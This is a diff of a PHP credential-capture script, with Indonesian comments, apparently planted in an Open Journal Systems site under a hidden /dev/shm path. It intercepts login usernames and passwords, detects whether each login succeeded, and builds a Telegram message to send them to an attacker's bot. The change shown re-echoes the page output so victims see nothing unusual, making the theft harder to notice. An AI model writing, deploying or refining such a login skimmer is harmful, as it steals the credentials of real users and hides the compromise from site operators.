@@ -1,6 +1,6 @@
 <?php
 /**
- * OJS LOGIN CAPTURE - DENGAN DETEKSI SUKSES/GAGAL
+ * OJS LOGIN CAPTURE - DENGAN DETEKSI SUKSES/GAGAL (FIXED)
  * File: /dev/shm/.ojs_capture
  */
 
@@ -18,8 +18,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 if (!empty($username) && !empty($password)) {
     
-    // TANGKAP RESPONSE DARI OJS (apakah login berhasil atau gagal)
-    // Kita mulai capture output
+    // Mulai capture output
     ob_start();
     
     // Simpan data untuk dikirim setelah kita tahu hasil login
@@ -33,12 +32,16 @@ if (!empty($username) && !empty($password)) {
         'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
     ];
     
-    // Register shutdown function untuk cek hasil setelah proses selesai
+    // Register shutdown function
     register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
-        // Ambil response yang sudah di-generate
+        // Ambil response
         $response = ob_get_clean();
         
-        // Cek apakah login GAGAL (ada pesan error)
+        // ========== KIRIM LAGI OUTPUT KE BROWSER (INI YANG DITAMBAH) ==========
+        echo $response;  // ← INI KUNCI NYA! Agar halaman tidak putih
+        // ====================================================================
+        
+        // Cek apakah login GAGAL
         $is_failed = false;
         $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah'];
         
@@ -49,7 +52,7 @@ if (!empty($username) && !empty($password)) {
             }
         }
         
-        // Cek apakah ada redirect ke dashboard (indikasi sukses)
+        // Cek apakah sukses (redirect)
         $headers = headers_list();
         $is_success = false;
         foreach ($headers as $header) {
@@ -72,7 +75,7 @@ if (!empty($username) && !empty($password)) {
             $emoji = '🔐';
         }
         
-        // Kirim notifikasi
+        // Kirim notifikasi Telegram
         $message = "{$emoji} OJS LOGIN {$status}\n";
         $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
         $message .= "👤 USERNAME: {$login_data['username']}\n";
